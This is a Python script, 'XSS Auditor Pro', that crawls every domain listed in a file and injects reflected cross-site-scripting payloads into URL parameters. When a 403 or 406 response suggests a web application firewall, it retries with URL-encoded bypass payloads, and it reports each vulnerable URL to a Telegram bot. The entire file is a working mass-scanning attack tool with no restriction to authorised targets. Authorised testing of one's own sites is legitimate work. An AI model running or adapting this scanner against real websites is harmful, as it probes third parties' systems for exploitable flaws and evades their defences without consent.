import requests
import re
import urllib.parse
import threading
import queue
import json
import time
from bs4 import BeautifulSoup
import concurrent.futures
import sys

TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
NORMAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
]
WAF_BYPASS_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
]
CRAWL_LIMIT = 200
TIMEOUT = 5
THREADS = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS Auditor Pro V3)"
}

visited_links = set()
lock = threading.Lock()
results = []
RESULT_JSON = "results.json"
PRIMARY_FIELDS = ["q", "s", "search", "keyword"]

def send_telegram_alert(vuln_type, vulnerable_url):
    domain = urllib.parse.urlparse(vulnerable_url).netloc
    message = (
        "🚨 *XSS Vulnerability Detected!*\n\n"
        f"*Domain:* `{domain}`\n"
        f"*Vulnerability Type:* {vuln_type}\n"
        f"*Vulnerable URL:* [Click Here]({vulnerable_url})\n\n"
        "#XSS #SecurityTest"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, data=data, timeout=TIMEOUT)
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def discover_subdomains(domain):
    # (Optional) Not deep needed for XSS labs but left in structure
    return []

def extract_links(url):
    links = []
    try:
        res = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        for tag in soup.find_all("a", href=True):
            link = urllib.parse.urljoin(url, tag['href'])
            if url.split('/')[2] in link:
                links.append(link)
    except Exception:
        pass
    return links

def find_input_fields(url):
    """Extract input fields and prioritize search box."""
    inputs = []
    try:
        res = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            input_tags = form.find_all("input")
            for input_tag in input_tags:
                name = input_tag.get("name")
                if name:
                    inputs.append(name)
    except Exception:
        pass
    return inputs

def save_results():
    try:
        with open(RESULT_JSON, "w") as jf:
            json.dump(results, jf, indent=4)
        print(f"\n[+] Results saved to {RESULT_JSON}")
    except Exception as e:
        print(f"[!] Saving results failed: {e}")

def test_parameter(url, param_name, payload_list, retry=False):
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for payload in payload_list:
        test_params = query_params.copy()
        test_params[param_name] = payload
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = f"{base}?{test_query}"

        try:
            res = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if payload in res.text:
                print(f"[+] Reflected XSS Found: {test_url}")
                results.append({
                    "domain": parsed.netloc,
                    "vuln_type": "Reflected XSS",
                    "vulnerable_url": test_url
                })
                send_telegram_alert("Reflected XSS", test_url)
                return
            elif res.status_code in [403, 406] and not retry:
                test_parameter(url, param_name, WAF_BYPASS_PAYLOADS, retry=True)
        except Exception:
            pass

def crawl_and_test(start_url):
    q = queue.Queue()
    q.put(start_url)

    total = 0

    while not q.empty():
        url = q.get()
        with lock:
            if url in visited_links or total >= CRAWL_LIMIT:
                continue
            visited_links.add(url)
            total += 1

        links = extract_links(url)
        for link in links:
            if link not in visited_links:
                q.put(link)

        crawl_progress = (len(visited_links) / CRAWL_LIMIT) * 100
        sys.stdout.write(f"\r[+] Crawling Progress: {crawl_progress:.2f}%")
        sys.stdout.flush()

        input_fields = find_input_fields(url)
        if input_fields:
            priority_inputs = [f for f in input_fields if any(p in f.lower() for p in PRIMARY_FIELDS)]
            other_inputs = [f for f in input_fields if f not in priority_inputs]

            for param in priority_inputs:
                for payload in NORMAL_PAYLOADS:
                    test_parameter(url, param, [payload])

            for param in other_inputs:
                for payload in NORMAL_PAYLOADS:
                    test_parameter(url, param, [payload])

    print()

def process_domain(domain):
    targets = [domain]
    subdomains = discover_subdomains(domain.replace("https://", "").replace("http://", ""))
    targets.extend(subdomains)

    print(f"[*] Found {len(subdomains)} subdomains for {domain}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(crawl_and_test, targets)

def main():
    print("\nXSS Auditor Pro by Aung Myat Thu [w01f]\n")
    domain_file = "domains.txt"
    try:
        with open(domain_file, "r") as f:
            domains = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read domains.txt: {e}")
        return

    for domain in domains:
        if not domain.startswith("http"):
            domain = "https://" + domain
        print(f"[*] Starting scan for {domain}")
        process_domain(domain)

    save_results()

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
